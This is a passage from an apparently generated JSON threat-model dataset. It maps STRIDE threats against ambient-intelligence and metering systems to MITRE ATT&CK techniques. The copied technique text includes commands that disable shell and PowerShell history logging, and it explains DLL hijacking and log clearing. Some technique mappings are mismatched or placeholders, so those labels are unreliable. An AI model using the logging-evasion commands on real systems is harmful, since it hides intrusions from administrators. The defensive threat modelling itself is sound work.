                    "Condition": "When endpoints provide model access."
                },
                {
                    "Assumption": "The attacker can discover and exploit these endpoints.",
                    "Role": "Attacker",
                    "Condition": "Via reconnaissance and exploitation methods."
                }
            ],
            "Potential Impact": "Compromise of intellectual property and strategic information.",
            "MITRE ATT&CK Keywords": [
                "API exposure",
                "model data leakage",
                "endpoint exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overwhelming the system's communication infrastructure with excessive traffic.",
            "Assumptions": [
                {
                    "Assumption": "The communication infrastructure is not adequately protected against high traffic volumes.",
                    "Role": "System",
                    "Condition": "During normal operation without DDoS protection."
                },
                {
                    "Assumption": "The attacker has a botnet or similar resources to generate traffic.",
                    "Role": "Attacker",
                    "Condition": "If having control over enough resources."
                },
                {
                    "Assumption": "Monitoring for unusual traffic patterns is insufficient.",
                    "Role": "System",
                    "Condition": "Without effective intrusion detection systems."
                }
            ],
            "Potential Impact": "Disruption of service availability and performance degradation.",
            "MITRE ATT&CK Keywords": [
                "traffic flooding",
                "botnet attack",
                "network congestion"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malfunction or failure of critical AMI system components due to hardware exploitation.",
            "Assumptions": [
                {
                    "Assumption": "Critical components are accessible and not physically secured.",
                    "Role": "System",
                    "Condition": "During installation in vulnerable locations."
                },
                {
                    "Assumption": "The attacker can physically interact with these components.",
                    "Role": "Attacker",
                    "Condition": "When the environment allows proximity."
                },
                {
                    "Assumption": "There is no redundancy for these critical components.",
                    "Role": "System",
                    "Condition": "If designed with single points of failure."
                }
            ],
            "Potential Impact": "Temporary or prolonged system unavailability.",
            "MITRE ATT&CK Keywords": [
                "hardware failure",
                "physical sabotage",
                "critical component attack"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of known software vulnerabilities to crash the system.",
            "Assumptions": [
                {
                    "Assumption": "System software contains known vulnerabilities.",
                    "Role": "System",
                    "Condition": "Due to unpatched or outdated software."
                },
                {
                    "Assumption": "The attacker has discovered and can exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Via vulnerability databases and testing."
                },
                {
                    "Assumption": "Mitigation measures for such exploits are absent.",
                    "Role": "System",
                    "Condition": "If security patches are delayed or ignored."
                }
            ],
            "Potential Impact": "System crashes leading to unavailability of services.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "system crash",
                "unpatched software"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploiting an unpatched firmware vulnerability to gain root access.",
            "Assumptions": [
                {
                    "Assumption": "Firmware contains known, unpatched vulnerabilities.",
                    "Role": "System",
                    "Condition": "During firmware lifecycle without updates."
                },
                {
                    "Assumption": "The attacker has sophisticated knowledge of the system's firmware.",
                    "Role": "Attacker",
                    "Condition": "If conducting targeted attacks."
                },
                {
                    "Assumption": "System monitoring does not include firmware-level integrity checks.",
                    "Role": "System",
                    "Condition": "Without deep integrity verification."
                }
            ],
            "Potential Impact": "Full system control leading to extensive unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "firmware vulnerability",
                "root access",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider modifying security permissions to escalate their access rights.",
            "Assumptions": [
                {
                    "Assumption": "Access control policies do not prevent unauthorized modifications.",
                    "Role": "System",
                    "Condition": "If policies lack strict enforcement."
                },
                {
                    "Assumption": "The insider role has sufficient existing privileges to modify permissions.",
                    "Role": "Insider",
                    "Condition": "Where job role provides some level of access."
                },
                {
                    "Assumption": "There is insufficient monitoring of permission changes.",
                    "Role": "System",
                    "Condition": "If changes are not logged or audited."
                }
            ],
            "Potential Impact": "Unauthorized access leading to data breach or sabotage.",
            "MITRE ATT&CK Keywords": [
                "access control",
                "insider threat",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
                "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
                "technique_id": "T1222.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leveraging a vulnerable third-party library to execute code with higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "The system uses third-party libraries without thorough vetting.",
                    "Role": "System",
                    "Condition": "During development cycles."
                },
                {
                    "Assumption": "The library contains a vulnerability that allows privilege escalation.",
                    "Role": "Third-party Library",
                    "Condition": "As identified by the attacker."
                },
                {
                    "Assumption": "Mitigations such as application sandboxing are not in place.",
                    "Role": "System",
                    "Condition": "Without isolation mechanisms."
                }
            ],
            "Potential Impact": "Expanded attacker capabilities and unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "third-party code",
                "library vulnerability",
                "code execution",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files.(Citation: Adversaries Hijack DLLs) They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
                "technique_id": "T1574.001"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "13",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses compromised biometric data to gain unauthorized access to the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "Biometric data can be intercepted during transmission.",
                    "Role": "Attacker",
                    "Condition": "Has access to the network carrying the biometric data."
                },
                {
                    "Assumption": "The AmI system relies on biometric data for authentication without additional checks.",
                    "Role": "System Designer",
                    "Condition": "Implements single-factor authentication using biometrics."
                },
                {
                    "Assumption": "The storage of biometric data includes weak encryption methods.",
                    "Role": "System Administrator",
                    "Condition": "Uses outdated or weak encryption standards."
                }
            ],
            "Potential Impact": "Unauthorized access leading to data leakage, tampering, and denial of service.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "biometric",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs smart card credentials to gain unauthorized access to the system.",
            "Assumptions": [
                {
                    "Assumption": "Smart card credentials can be copied or duplicated.",
                    "Role": "Attacker",
                    "Condition": "Has physical or remote access to the smart card."
                },
                {
                    "Assumption": "The AmI system does not verify the authenticity of smart card issuance.",
                    "Role": "System Designer",
                    "Condition": "Implements smart card authentication without strong issuance verification."
                },
                {
                    "Assumption": "Card readers are not tamper-proof or are left unsecured.",
                    "Role": "System Administrator",
                    "Condition": "Maintains unsecured or easily tampered smart card readers."
                }
            ],
            "Potential Impact": "Unauthorized access leading to system disruption and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "smart card",
                "credential theft"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses phishing techniques to steal passwords and gain access to the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "Users can be tricked into providing their login credentials.",
                    "Role": "User",
                    "Condition": "Falls for phishing emails or messages."
                },
                {
                    "Assumption": "The system relies heavily on password-based authentication.",
                    "Role": "System Designer",
                    "Condition": "Implements weak or single-factor password authentication."
                },
                {
                    "Assumption": "There is a lack of user awareness regarding phishing attacks.",
                    "Role": "User Training Department",
                    "Condition": "Does not provide regular phishing awareness training."
                }
            ],
            "Potential Impact": "Unauthorized access leading to data confidentiality breaches and system manipulation.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "password theft",
                "spoofing"
            ],
            "mitre_technique": {
                "name": "Spearphishing Attachment",
                "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
                "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
                "technique_id": "T1566.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters data sent from sensors to the cloud storage.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not encrypted.",
                    "Role": "System Administrator",
                    "Condition": "Uses insecure communication channels."
                },
                {
                    "Assumption": "The attacker has access to the network.",
                    "Role": "Attacker",
                    "Condition": "Gains unauthorized access to the network infrastructure."
                },
                {
                    "Assumption": "The AmI system lacks integrity verification mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Does not implement data integrity checks."
                }
            ],
            "Potential Impact": "Data corruption, leading to incorrect decision-making and potential safety hazards.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data injection",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker uploads malicious code into the machine learning models.",
            "Assumptions": [
                {
                    "Assumption": "ML models are not securely updated.",
                    "Role": "System Administrator",
                    "Condition": "Lacks secure update mechanisms."
                },
                {
                    "Assumption": "The attacker has write access to the model storage.",
                    "Role": "Attacker",
                    "Condition": "Gains administrative privileges or leverages a vulnerability."
                },
                {
                    "Assumption": "There is no validation of model integrity before deployment.",
                    "Role": "System Designer",
                    "Condition": "Does not perform integrity checks on models."
                }
            ],
            "Potential Impact": "Compromised system functionalities and potential data leakage.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "model poisoning",
                "malicious code"
            ],
            "mitre_technique": {
                "name": "Supply Chain Compromise",
                "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)",
                "id": "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7",
                "technique_id": "T1195"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits router firmware vulnerabilities to alter network traffic.",
            "Assumptions": [
                {
                    "Assumption": "Routers have unpatched firmware vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Does not regularly update router firmware."
                },
                {
                    "Assumption": "The attacker has technical knowledge to exploit known vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Understands and can exploit firmware weaknesses."
                },
                {
                    "Assumption": "There is no network traffic monitoring in place.",
                    "Role": "Security Team",
                    "Condition": "Lacks network intrusion detection systems."
                }
            ],
            "Potential Impact": "Compromised data integrity and potential data rerouting to malicious servers.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network",
                "firmware vulnerability"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies performing actions within the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "The logging system is insufficient or non-existent.",
                    "Role": "System Administrator",
                    "Condition": "Does not implement detailed logging."
                },
                {
                    "Assumption": "Logs can be altered or deleted by unauthorized users.",
                    "Role": "Attacker/User",
                    "Condition": "Gains access to log files with sufficient privileges."
                },
                {
                    "Assumption": "No authentication records are kept for user actions.",
                    "Role": "System Designer",
                    "Condition": "Does not maintain authentication logs."
                }
            ],
            "Potential Impact": "Inability to trace user actions, leading to challenges in accountability and system misuse.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "user actions"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker clears the logs to cover their tracks after unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "The system allows log alteration by privileged users.",
                    "Role": "System Administrator",
                    "Condition": "Allows high-level access to log files without checks."
                },
                {
                    "Assumption": "No tamper-evident mechanisms are in place for logs.",
                    "Role": "System Designer",
                    "Condition": "Does not implement tamper detection for logs."
                },
                {
                    "Assumption": "Logging mechanisms do not send copies to a secure location.",
                    "Role": "Security Team",
                    "Condition": "Does not implement remote log storage."
                }
            ],
            "Potential Impact": "Loss of forensic evidence, leading to difficulties in incident investigation and resolution.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log clearing",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A legitimate user denies sending commands to actuators that lead to unintended operations.",
            "Assumptions": [
                {
                    "Assumption": "The system does not log actuator commands.",
                    "Role": "System Designer",
                    "Condition": "Does not implement command logging mechanisms."
                },
                {
                    "Assumption": "Actuators can operate without authenticated commands.",
                    "Role": "System Designer",
                    "Condition": "Allows unauthenticated operations for convenience."
                },
                {
                    "Assumption": "There is no user action verification process.",
                    "Role": "System Administrator",
                    "Condition": "Does not implement user verification for critical operations."
                }
            ],
            "Potential Impact": "Potential for system misuse and safety risk due to lack of accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "actuator commands",
                "command logging"
            ],
            "mitre_technique": {
                "name": "Impair Command History Logging",
                "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",
                "id": "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59",
                "technique_id": "T1562.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data intercepted during wireless transmission.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted over an unencrypted wireless network.",
                    "Role": "System Administrator",
                    "Condition": "Uses unsecured wireless channels."
                },
                {
                    "Assumption": "The attacker has tools to capture wireless data packets.",
                    "Role": "Attacker",
